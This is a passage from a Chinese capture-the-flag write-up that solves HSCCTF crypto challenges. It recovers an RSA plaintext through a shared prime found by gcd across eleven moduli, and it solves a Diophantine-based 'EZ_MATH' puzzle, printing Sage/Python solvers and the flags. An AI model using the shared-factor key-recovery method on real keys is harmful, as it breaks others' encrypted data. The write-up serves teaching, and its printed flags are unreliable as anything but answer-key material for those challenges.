13266094979118433615107077438835111371457503704538616496563510289250600197984029767950953071723442381279904747724269706555801425883117040972832035397268347603612025741219452353130266755150965019441092380030226256032720651858600172996344598355816134478110939124633509594465443169697188695226358357129879780253706604232278678465680358018262084198108533077519049507811758423498512565521615931699494491595078723098101084217611204442585182103261006086144344612398896576066999950905966920722348056083426326740287336766359383868804991393096926457607860171709146742941740864780610226463852018204647096292737915760430291250813</span></span><br><span class="line"><span class="string">c1 = 10454892625278317641789872724686322205927252335791803070937784201169059579634108503308033729970364983743915474860354063759051514315619953792921367621385574749886778911471839079815820922430263016140141364094131496885155882486798302404238523986615316359385759537428069831379320707742928167131988641527992674882901567191207763547432299532710945549959580670112346830919500694014972444803904248586178887470465867991650480024904327432717911313867713120525202669101524778826445503383549733326775312427637839488477432162027468606568090607495541492335140760946449358303999218277269859230888292780234275495274787996001069959971</span></span><br><span class="line"><span class="string">n2 = 13561524319281645924409429988746244285924512610515302181526524036825687984904507677894611353344735741110533280540372734178963216876945066232927791369207852762146826883906093804958723203309030840804897999205074456325062789110452940484077408580876939074453733126571662068654441714639301799127584606087971553812926212292460761915985786461807649546286330834719746624387850833859250717790492671884734393055454074719585937904232516659582736211933280011591605069686791049628396762690038333975652490908544846890333889140489210242676577675968427325105786641017561929481335597681693818435892140856959673754213600282444761045909</span></span><br><span class="line"><span class="string">c2 = 3809937396638973793281111150837774607768836561256425490071061814543315217182689579329457784159377040740840790603579270672790822179042079055887400637582022659400594844425891666493759469522229692267103516295923589666151948947533002975509430505778081264268698292606209538047240829756919764958544518311993684790118122163859571923899116815269989298822142104789156965964388346807167061332155392766290531602747731916010774318400533536413925876554324550780136191458776623029231802991319498346243427246484439391940676640693616519788950250194620455331557435567742874072637005171754550020619361150150760807391307377493836703076</span></span><br><span class="line"><span class="string">n3 = 20819967432768567938753694422911303382713641435728476601586838051751312782014589687874100683447016549893853820399247909653519950995166805072380656652093579604808569443345700131756901813968185726839863492859231569896747987531341038527577030274701158504736611486411122416871876820360598851918276248520018793494992493852386399935919098185299268920688465446256283333918993392163947559470887074488117510961172278330026050882249897526926951246915378841961743261451053094912730850754242934166148766977209435597121171360066632973035097557482087715745940551760350028517912402795353929678770383484462337839762404384487582066453</span></span><br><span class="line"><span class="string">c3 = 11563829913521314742585136805475993461403465700108053759771484386843765447294825812595747844564874801821547385942939017711043792590427266240133027831461974927558652665067213878683577605892319949704019193752250409813868906421753286690558646631157080887991363101311595921894128110588310204725909211948500421818595333014728114922612870236792445180757918034580210383348205174677492784034863701447097219480133095005954043490631339361280493810083309703940614371501369647446672052159714963350601039281652141446041256158792981347520865671115091097366786582678000769990989485879756562971825181583852052194492966890258786944315</span></span><br><span class="line"><span class="string">n4 = 19517605474769458566764053169103203900538883167125789442948194023333599294853531273087386563161613748743818343948170765525802041313369094525708034240492038517491037697421019698672940028061489377078569027204940525741751607758706837789276571889269840463242449627036923444536643477208091664006240106337894541529098279162689793633659155131183323675883233214674098857553487390844015483326711766090826364639791072315148015450491509411705543419711632894282105698410629463141048089867016193055384530738113369352506445669521342292860468297676826301170714618519525841753642713267083007541894156522819536935129135488289198694889</span></span><br><span class="line"><span class="string">c4 = 12720867554077215609167247949706745145667570273372296302246080668969511222297653722462456233088262153562301044885409538816931281414687572296907970004441185871229786306419586839050961363065587925188623309437687878362349712010861419409491068481019724226070296781806932012179356550421791040143093709543578156689726256993615533679238619784087615967419616376736870824897695863732260595608905898821074250285903989668303290834003098691902990265526695777899489911426855957844561961729063644070823142386451495647995297413399808476505524581260464059786283824394788336780567702950051743361294131648282343329587709077103035316720</span></span><br><span class="line"><span class="string">n5 = 15315765971812428868126611109300419975777573811870059860288938012581131143314666287089472408729190306740351316922426244732585067377217502116440145450875665683575473308102742095244349804293311006664351646952181210686812748912418175736013835669191549110546127830831456068811493086787520032272004231879188572130659936937680177977058975692716116961651093033986073297040678707534300965722868263825444198679243070507413216087205293997006805636338567585815764233374917745809135568855524993022583535608349280044851332779641619210310837108819273508771161881712796235518243572549756276118053736270122787899173695729089911000177</span></span><br><span class="line"><span class="string">c5 = 1996576325989768324317887012680560370528949194626393664650182754791578697786369958145137743555674312911707989139883926276952465377328602829900403114611234863417183707678398047030046855450074260654432278156903388641948696716193734714839957624359533486844023111115297718398319120718217043728064595217651738180806194912581964346594873253580010279706758241793778842399330631789750327865945625117967957133863637176404309782516880511747771793712203903185512285327103080133567660391921038681393551945607152726063692641742286406772926103324078574181176632321287759066802783643421564667257668981655199672490410258387124896839</span></span><br><span class="line"><span class="string">n6 = 22501623321194869030526666823514739767749207843970334295553523279818676682652976959807729381646792676134988101065783136759904452189288813040860021497429422935571083993146794186207853146483681094375360774768406629588311381375206331368965836725531623084019451921330442379292718421616088275750226791314378297932358311378533569620671423740598033204639634035814689781736104197321348154999759210532651451336192376531975837284751978609197068573278551236896713762616106051882505752287773203197087939983952212761603430314087275042009367400077728025285967811883773835952547025411853395307325959904214255100115763377527761863243</span></span><br><span class="line"><span class="string">c6 = 16972901653690784382193404778525843883847230468707217844241233207197480301434902629018088740822889948972102445668033489181324675531537650785766582307112083721410506834279363487814759021815005839906656731069521758605293428928322712895510490968448490116732590950772037788323801838566829526879837783860631971103738986788475652187080935944428662363573097225322630574705977616143315497272754050608117449938161772409924992453640310621899223691851303921323537779068346575997621024660907750345496836548887894110692437965970524341315015139872598871247336564148953981001708145253728789799483753931039894943324458172207408514055</span></span><br><span class="line"><span class="string">n7 = 20222972180177072345801227937253710431874005900913732040381986459681923475683145372990375296354647420667483866455563976492495863306613645199351725323069254033914660444884681801701527128578914815647228265457580192591405358646605069362025887082090772778349481109768859094222573588734354390770166651349176555216207359309348018342505464249804607873118984688190648392606550835717828160317062604597079101529586592809846608153548090689114431569844519317969076852156023429809918618137153901636552629572816865533796914796916912143735510069871682428043277595493567381686086440480398579063801490541087200975224372047447666853577</span></span><br><span class="line"><span class="string">c7 = 19248329020030453774384696880312801243022181399316695013193573740699955812434234453445733160128408889312090775734047782876100145988183327884917215679382382881065419870764186721970622248713761494850863082727373673264251951250813933154161422645331713437130381414540777017708015790836797014483890216068812718266206449620134392843370036352310247384624064366465809379383305877737001168693796305842850301708205795174536047495356081533121119809621200677554802850741327026857766466801847093397207492834507197621929666294565502206253758771807936447505283097006026148803103761799795917848061959407655084012166916418019312249784</span></span><br><span class="line"><span class="string">n8 = 28799545621025859784610107508239196961299975467825740831913751504915874851330462439158635575405356818113410333683180082332165697120427112955103148744439425445183885200419323900649247390987373643732545351428341672132606990651983217136427779727640093677134233750683573339125630816150512829880758197582740742903567508671599670638441690064624970884849155079924261319378412468315205937959638074779010811695132863607314175199659821450983825173738122749043063821539706648079731459596593171608003970504410762959266052601005965264083020025264976022719772719760327913949451765549596654112776579032915566112007668167772800022899</span></span><br><span class="line"><span class="string">c8 = 1557912453709476966737076991561069916132026563623952214325899450684779611396005511525194425002377424080593548871717093344298154722414402662579348749814362372502553596876087924405512346139642130044966150910684629355033505918013408065432489689359533653824531829749196503353303426506457519870729578421517704788083837871239684468506646791031429111449024396111145925900274462731352865657439734650971847748974665555525054155117163435567228916046859498167502129739768590572170326191362542459346405142436764480239930123323175219488501180973820200030365386979265642090761227134669853119027964377516064450203673169996741108201</span></span><br><span class="line"><span class="string">n9 = 10724722645304259715795299819065674754042984013786210584506231300619560676108475536395272046569973743641251757746061197828519780315618458377103563062231183483417813026164932742828160245936263717653018746001798106670074713826425538758327538077666818411803556790303118703675214570232032363741244652199877829850941356975349610433270602500949664737614829264570720376982697613497917773407899889472415398738368753150300782201701629840263791099898799223939097237737763305744244520913831151361155926462086252389196548583215275230652627205709362921989235487237437830519479308853639024184940767904019468405024567279269194660457</span></span><br><span class="line"><span class="string">c9 = 7054636121132343583858699301095750714111235817920115459468707884725018199621185268565462099537583727231123935665880304441155106987655834264363622503952228720525242179508079016631089564472694196928292967592007090527901832440980478605545275893294775905732209796463597105116676363505607644384293210905609044898854823349412282236466031666385339991490559120640881321780940909164095426401350314009757434019464208207922992311335823038396957805698822367795673327054284423260967631762122524511318733561339982590040303505605155884427567432712042870632816967182611225212150848091424300840160529323960243459920269872536666352976</span></span><br><span class="line"><span class="string">n10 = 16304817901397483417456609341516124523232426780023397228272913044723365389571327797134591736977502692057727416394924310828824378024812777529367342707896494815960255682947685036902235997899886291633609041685897197272675911304941501067794795285949540313990226409651292120126492714998892290044111541098365692731185787360609198921681736777103794430653696698141195954719030883935151980847339939213040373252819145655067286986300641668994700390921458682571619409488233289211738521046085311253119526685912893458131534718050802684180285138809217274273877376347024021056317566312186133916744533463879779997794540361760393219489</span></span><br><span class="line"><span class="string">c10 = 6039122660803656157700054739064564338439549484695206214016006129508782362229842967602464077735874540107161459041835340990108817139672137870642935613531313583963930144871458733026396223674801557621036949312116639217447114899726858984281194116508244403985568785765273838572470898925521147022021516862658967584135454474355381073026066426450614788381002057980590442338766869104957577338546687759141228942149374485785893539335288536729328218172278370763183603422629799846611737710865681572257803448960656692506773086527389616178693152885260795303008111935277529561576915114165678564997923634906377059491989399467738069641</span></span><br><span class="line"><span class="string">n11 = 26625591570108917991847624024325819020320989255483608230644879476517915211995542896341416515605576928392317717654695767006784744751962205355107012859426134474074616134986414248054781712130892076462288761672616993287474215271046602443215449210026303978249752825306035097841429567784265656890801589418315449927543660131967365276637662563112328427813183398517944210120851841495001293543971765864382060100600179108814852829473884481867272716907064729991187798328733196676298681328399250356028155411865948758466337763025886685436650643428510593697176416735568250615673642866668416526682341721998481502482877972649018501469</span></span><br><span class="line"><span class="string">c11 = 20247005397625616228661928392695469647749434533141783786437968083066137357689767280753532605896419173332597529708801946906363780592876111104850302784033136335456683361128603662454728234349563238948801712907903185993561076754164552845510795293521029798357876214260903355702688269527465118808832941386890598851762900876512383557653940846232884627557957652638581022140825373023173482471791720148792301241581919765510220083079365311297081633979398855966991069020584462613981094888736916444009463104235004451765533162593406749138640537670707679905027165914805299755934758172748227146495107002603546338597452964759860431081</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>爆破找到 $\gcd(n_i,n_j)&gt;1$ 的情形，即为 $\gcd(n_i,n_j)=p$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">n1 = <span class="number">13266094979118433615107077438835111371457503704538616496563510289250600197984029767950953071723442381279904747724269706555801425883117040972832035397268347603612025741219452353130266755150965019441092380030226256032720651858600172996344598355816134478110939124633509594465443169697188695226358357129879780253706604232278678465680358018262084198108533077519049507811758423498512565521615931699494491595078723098101084217611204442585182103261006086144344612398896576066999950905966920722348056083426326740287336766359383868804991393096926457607860171709146742941740864780610226463852018204647096292737915760430291250813</span></span><br><span class="line">c1 = <span class="number">10454892625278317641789872724686322205927252335791803070937784201169059579634108503308033729970364983743915474860354063759051514315619953792921367621385574749886778911471839079815820922430263016140141364094131496885155882486798302404238523986615316359385759537428069831379320707742928167131988641527992674882901567191207763547432299532710945549959580670112346830919500694014972444803904248586178887470465867991650480024904327432717911313867713120525202669101524778826445503383549733326775312427637839488477432162027468606568090607495541492335140760946449358303999218277269859230888292780234275495274787996001069959971</span></span><br><span class="line">n2 = <span class="number">13561524319281645924409429988746244285924512610515302181526524036825687984904507677894611353344735741110533280540372734178963216876945066232927791369207852762146826883906093804958723203309030840804897999205074456325062789110452940484077408580876939074453733126571662068654441714639301799127584606087971553812926212292460761915985786461807649546286330834719746624387850833859250717790492671884734393055454074719585937904232516659582736211933280011591605069686791049628396762690038333975652490908544846890333889140489210242676577675968427325105786641017561929481335597681693818435892140856959673754213600282444761045909</span></span><br><span class="line">c2 = <span class="number">3809937396638973793281111150837774607768836561256425490071061814543315217182689579329457784159377040740840790603579270672790822179042079055887400637582022659400594844425891666493759469522229692267103516295923589666151948947533002975509430505778081264268698292606209538047240829756919764958544518311993684790118122163859571923899116815269989298822142104789156965964388346807167061332155392766290531602747731916010774318400533536413925876554324550780136191458776623029231802991319498346243427246484439391940676640693616519788950250194620455331557435567742874072637005171754550020619361150150760807391307377493836703076</span></span><br><span class="line">n3 = <span class="number">20819967432768567938753694422911303382713641435728476601586838051751312782014589687874100683447016549893853820399247909653519950995166805072380656652093579604808569443345700131756901813968185726839863492859231569896747987531341038527577030274701158504736611486411122416871876820360598851918276248520018793494992493852386399935919098185299268920688465446256283333918993392163947559470887074488117510961172278330026050882249897526926951246915378841961743261451053094912730850754242934166148766977209435597121171360066632973035097557482087715745940551760350028517912402795353929678770383484462337839762404384487582066453</span></span><br><span class="line">c3 = <span class="number">11563829913521314742585136805475993461403465700108053759771484386843765447294825812595747844564874801821547385942939017711043792590427266240133027831461974927558652665067213878683577605892319949704019193752250409813868906421753286690558646631157080887991363101311595921894128110588310204725909211948500421818595333014728114922612870236792445180757918034580210383348205174677492784034863701447097219480133095005954043490631339361280493810083309703940614371501369647446672052159714963350601039281652141446041256158792981347520865671115091097366786582678000769990989485879756562971825181583852052194492966890258786944315</span></span><br><span class="line">n4 = <span class="number">19517605474769458566764053169103203900538883167125789442948194023333599294853531273087386563161613748743818343948170765525802041313369094525708034240492038517491037697421019698672940028061489377078569027204940525741751607758706837789276571889269840463242449627036923444536643477208091664006240106337894541529098279162689793633659155131183323675883233214674098857553487390844015483326711766090826364639791072315148015450491509411705543419711632894282105698410629463141048089867016193055384530738113369352506445669521342292860468297676826301170714618519525841753642713267083007541894156522819536935129135488289198694889</span></span><br><span class="line">c4 = <span class="number">12720867554077215609167247949706745145667570273372296302246080668969511222297653722462456233088262153562301044885409538816931281414687572296907970004441185871229786306419586839050961363065587925188623309437687878362349712010861419409491068481019724226070296781806932012179356550421791040143093709543578156689726256993615533679238619784087615967419616376736870824897695863732260595608905898821074250285903989668303290834003098691902990265526695777899489911426855957844561961729063644070823142386451495647995297413399808476505524581260464059786283824394788336780567702950051743361294131648282343329587709077103035316720</span></span><br><span class="line">n5 = <span class="number">15315765971812428868126611109300419975777573811870059860288938012581131143314666287089472408729190306740351316922426244732585067377217502116440145450875665683575473308102742095244349804293311006664351646952181210686812748912418175736013835669191549110546127830831456068811493086787520032272004231879188572130659936937680177977058975692716116961651093033986073297040678707534300965722868263825444198679243070507413216087205293997006805636338567585815764233374917745809135568855524993022583535608349280044851332779641619210310837108819273508771161881712796235518243572549756276118053736270122787899173695729089911000177</span></span><br><span class="line">c5 = <span class="number">1996576325989768324317887012680560370528949194626393664650182754791578697786369958145137743555674312911707989139883926276952465377328602829900403114611234863417183707678398047030046855450074260654432278156903388641948696716193734714839957624359533486844023111115297718398319120718217043728064595217651738180806194912581964346594873253580010279706758241793778842399330631789750327865945625117967957133863637176404309782516880511747771793712203903185512285327103080133567660391921038681393551945607152726063692641742286406772926103324078574181176632321287759066802783643421564667257668981655199672490410258387124896839</span></span><br><span class="line">n6 = <span class="number">22501623321194869030526666823514739767749207843970334295553523279818676682652976959807729381646792676134988101065783136759904452189288813040860021497429422935571083993146794186207853146483681094375360774768406629588311381375206331368965836725531623084019451921330442379292718421616088275750226791314378297932358311378533569620671423740598033204639634035814689781736104197321348154999759210532651451336192376531975837284751978609197068573278551236896713762616106051882505752287773203197087939983952212761603430314087275042009367400077728025285967811883773835952547025411853395307325959904214255100115763377527761863243</span></span><br><span class="line">c6 = <span class="number">16972901653690784382193404778525843883847230468707217844241233207197480301434902629018088740822889948972102445668033489181324675531537650785766582307112083721410506834279363487814759021815005839906656731069521758605293428928322712895510490968448490116732590950772037788323801838566829526879837783860631971103738986788475652187080935944428662363573097225322630574705977616143315497272754050608117449938161772409924992453640310621899223691851303921323537779068346575997621024660907750345496836548887894110692437965970524341315015139872598871247336564148953981001708145253728789799483753931039894943324458172207408514055</span></span><br><span class="line">n7 = <span class="number">20222972180177072345801227937253710431874005900913732040381986459681923475683145372990375296354647420667483866455563976492495863306613645199351725323069254033914660444884681801701527128578914815647228265457580192591405358646605069362025887082090772778349481109768859094222573588734354390770166651349176555216207359309348018342505464249804607873118984688190648392606550835717828160317062604597079101529586592809846608153548090689114431569844519317969076852156023429809918618137153901636552629572816865533796914796916912143735510069871682428043277595493567381686086440480398579063801490541087200975224372047447666853577</span></span><br><span class="line">c7 = <span class="number">19248329020030453774384696880312801243022181399316695013193573740699955812434234453445733160128408889312090775734047782876100145988183327884917215679382382881065419870764186721970622248713761494850863082727373673264251951250813933154161422645331713437130381414540777017708015790836797014483890216068812718266206449620134392843370036352310247384624064366465809379383305877737001168693796305842850301708205795174536047495356081533121119809621200677554802850741327026857766466801847093397207492834507197621929666294565502206253758771807936447505283097006026148803103761799795917848061959407655084012166916418019312249784</span></span><br><span class="line">n8 = <span class="number">28799545621025859784610107508239196961299975467825740831913751504915874851330462439158635575405356818113410333683180082332165697120427112955103148744439425445183885200419323900649247390987373643732545351428341672132606990651983217136427779727640093677134233750683573339125630816150512829880758197582740742903567508671599670638441690064624970884849155079924261319378412468315205937959638074779010811695132863607314175199659821450983825173738122749043063821539706648079731459596593171608003970504410762959266052601005965264083020025264976022719772719760327913949451765549596654112776579032915566112007668167772800022899</span></span><br><span class="line">c8 = <span class="number">1557912453709476966737076991561069916132026563623952214325899450684779611396005511525194425002377424080593548871717093344298154722414402662579348749814362372502553596876087924405512346139642130044966150910684629355033505918013408065432489689359533653824531829749196503353303426506457519870729578421517704788083837871239684468506646791031429111449024396111145925900274462731352865657439734650971847748974665555525054155117163435567228916046859498167502129739768590572170326191362542459346405142436764480239930123323175219488501180973820200030365386979265642090761227134669853119027964377516064450203673169996741108201</span></span><br><span class="line">n9 = <span class="number">10724722645304259715795299819065674754042984013786210584506231300619560676108475536395272046569973743641251757746061197828519780315618458377103563062231183483417813026164932742828160245936263717653018746001798106670074713826425538758327538077666818411803556790303118703675214570232032363741244652199877829850941356975349610433270602500949664737614829264570720376982697613497917773407899889472415398738368753150300782201701629840263791099898799223939097237737763305744244520913831151361155926462086252389196548583215275230652627205709362921989235487237437830519479308853639024184940767904019468405024567279269194660457</span></span><br><span class="line">c9 = <span class="number">7054636121132343583858699301095750714111235817920115459468707884725018199621185268565462099537583727231123935665880304441155106987655834264363622503952228720525242179508079016631089564472694196928292967592007090527901832440980478605545275893294775905732209796463597105116676363505607644384293210905609044898854823349412282236466031666385339991490559120640881321780940909164095426401350314009757434019464208207922992311335823038396957805698822367795673327054284423260967631762122524511318733561339982590040303505605155884427567432712042870632816967182611225212150848091424300840160529323960243459920269872536666352976</span></span><br><span class="line">n10 = <span class="number">16304817901397483417456609341516124523232426780023397228272913044723365389571327797134591736977502692057727416394924310828824378024812777529367342707896494815960255682947685036902235997899886291633609041685897197272675911304941501067794795285949540313990226409651292120126492714998892290044111541098365692731185787360609198921681736777103794430653696698141195954719030883935151980847339939213040373252819145655067286986300641668994700390921458682571619409488233289211738521046085311253119526685912893458131534718050802684180285138809217274273877376347024021056317566312186133916744533463879779997794540361760393219489</span></span><br><span class="line">c10 = <span class="number">6039122660803656157700054739064564338439549484695206214016006129508782362229842967602464077735874540107161459041835340990108817139672137870642935613531313583963930144871458733026396223674801557621036949312116639217447114899726858984281194116508244403985568785765273838572470898925521147022021516862658967584135454474355381073026066426450614788381002057980590442338766869104957577338546687759141228942149374485785893539335288536729328218172278370763183603422629799846611737710865681572257803448960656692506773086527389616178693152885260795303008111935277529561576915114165678564997923634906377059491989399467738069641</span></span><br><span class="line">n11 = <span class="number">26625591570108917991847624024325819020320989255483608230644879476517915211995542896341416515605576928392317717654695767006784744751962205355107012859426134474074616134986414248054781712130892076462288761672616993287474215271046602443215449210026303978249752825306035097841429567784265656890801589418315449927543660131967365276637662563112328427813183398517944210120851841495001293543971765864382060100600179108814852829473884481867272716907064729991187798328733196676298681328399250356028155411865948758466337763025886685436650643428510593697176416735568250615673642866668416526682341721998481502482877972649018501469</span></span><br><span class="line">c11 = <span class="number">20247005397625616228661928392695469647749434533141783786437968083066137357689767280753532605896419173332597529708801946906363780592876111104850302784033136335456683361128603662454728234349563238948801712907903185993561076754164552845510795293521029798357876214260903355702688269527465118808832941386890598851762900876512383557653940846232884627557957652638581022140825373023173482471791720148792301241581919765510220083079365311297081633979398855966991069020584462613981094888736916444009463104235004451765533162593406749138640537670707679905027165914805299755934758172748227146495107002603546338597452964759860431081</span></span><br><span class="line"></span><br><span class="line">n = []</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">12</span>):</span><br><span class="line">    n.append(<span class="built_in">eval</span>(<span class="string">f&#x27;n<span class="subst">&#123;i&#125;</span>&#x27;</span>))</span><br><span class="line">    c.append(<span class="built_in">eval</span>(<span class="string">f&#x27;c<span class="subst">&#123;i&#125;</span>&#x27;</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">        <span class="keyword">if</span> gcd(n[i],n[j]) != <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(i,j)</span><br><span class="line">            </span><br><span class="line">p = gcd(n[<span class="number">4</span>],n[<span class="number">5</span>])</span><br><span class="line">q = n[<span class="number">4</span>] // p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(<span class="number">65537</span>,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c[<span class="number">4</span>],d,n[<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#HSCCTF&#123;this_1s_yi_zhi_xiao_jiu_li&#125;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="EZ-MATH"><a href="#EZ-MATH" class="headerlink" title="EZ_MATH"></a>EZ_MATH</h3><blockquote><p>就是数学,学吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;HSCCTF&#123;*****************************************&#125;&#x27;</span></span><br><span class="line">x = bytes_to_long(flag.encode())</span><br><span class="line">y = getPrime(<span class="number">200</span>)</span><br><span class="line">z = getPrime(<span class="number">200</span>)</span><br><span class="line"><span class="keyword">assert</span> (x**<span class="number">2</span>+<span class="number">1</span>)*(y**<span class="number">2</span>+<span class="number">1</span>)*(z**<span class="number">2</span>+<span class="number">1</span>) + <span class="number">4</span> * ((x*y*z)*(x+y+z)+(x*y+x*z+y*z)) == jl + <span class="number">2</span>*(x+y+z+x*y*z)*(x*y+y*z+x*z+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">w = <span class="number">1007766898498955907869786015006414110177963571599690507305616866798367726133772947904112344473803352290475298324967917118497719002314168582330651485077694557008496465717884047202330407870172675541471666596768873677342429660840647109788577728613362048023960188394853332768656214046219781162891725391990618222498709603165658933818803574737</span></span><br><span class="line">a = jl + <span class="number">2024</span></span><br><span class="line">b = jl + <span class="number">2025</span></span><br><span class="line">c = getPrime(<span class="number">1000</span>)</span><br><span class="line"><span class="keyword">assert</span> w*(a*c + b*c - a*b) == <span class="number">4</span>*a*b*c</span><br></pre></td></tr></table></figure></blockquote><p>$w(ac + bc - ab) = 4abc \Longrightarrow \cfrac{4}{w} = \cfrac{1}{a} + \cfrac{1}{b} - \cfrac{1}{c}$</p><p>著名丢番图方程，参考 <a target="_blank" rel="noopener" href="https://scialert.net/fulltext/?doi=aja.2011.31.37#:~:text=The%20above%20relation%20can%20also,this%20is%20a%20Diophantine%20equation">这篇论文</a> 有 $a=\cfrac{w-1}{2},b=\cfrac{w+1}{2}$，故而得到 $jl$。</p><p>又 $jl=(x^2+1)(y^2+1)(z^2+1) + 4[(xyz)(x+y+z)+(xy+xz+yz)] - 2(x+y+z+xyz)(xy+yz+xz+1)=(x-1)^2(y-1)^2(z-1)^2$，</p><p>求出 $\sqrt{jl}$ 的所有因子，根据 $x,y,z$ 的位数限制，爆破即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">PR.&lt;x,y,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">f=(x**<span class="number">2</span>+<span class="number">1</span>)*(y**<span class="number">2</span>+<span class="number">1</span>)*(z**<span class="number">2</span>+<span class="number">1</span>) + <span class="number">4</span> * ((x*y*z)*(x+y+z)+(x*y+x*z+y*z)) - <span class="number">2</span>*(x+y+z+x*y*z)*(x*y+y*z+x*z+<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(f.factor())</span><br><span class="line"></span><br><span class="line"><span class="comment">#(z - 1)^2 * (y - 1)^2 * (x - 1)^2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">w = <span class="number">1007766898498955907869786015006414110177963571599690507305616866798367726133772947904112344473803352290475298324967917118497719002314168582330651485077694557008496465717884047202330407870172675541471666596768873677342429660840647109788577728613362048023960188394853332768656214046219781162891725391990618222498709603165658933818803574737</span></span><br><span class="line">a = (w-<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">b = (w+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">jl = a-<span class="number">2024</span></span><br><span class="line">s = jl.nth_root(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">sf = divisors(s)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(sf))</span><br><span class="line"></span><br><span class="line">yz = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sf)):</span><br><span class="line">    t = sf[i]+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> t &gt; <span class="number">2</span>^<span class="number">200</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> t &gt; <span class="number">2</span>^<span class="number">199</span> <span class="keyword">and</span> t &lt; <span class="number">2</span>^<span class="number">200</span> <span class="keyword">and</span> is_prime(t):</span><br><span class="line">        yz.append(t)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(yz)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>, <span class="built_in">len</span>(yz)):</span><br><span class="line">        x = long_to_bytes(s // ((yz[i]-<span class="number">1</span>)*(yz[j]-<span class="number">1</span>)) + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> x.isascii():</span><br><span class="line">            <span class="built_in">print</span>(x)</span><br><span class="line">			</span><br><span class="line"><span class="comment">#b&#x27;HSCCTF&#123;math_is_good&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="SIGN-IN"><a href="#SIGN-IN" class="headerlink" title="SIGN_IN"></a>SIGN_IN</h3><blockquote><p>这是签到题啦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td 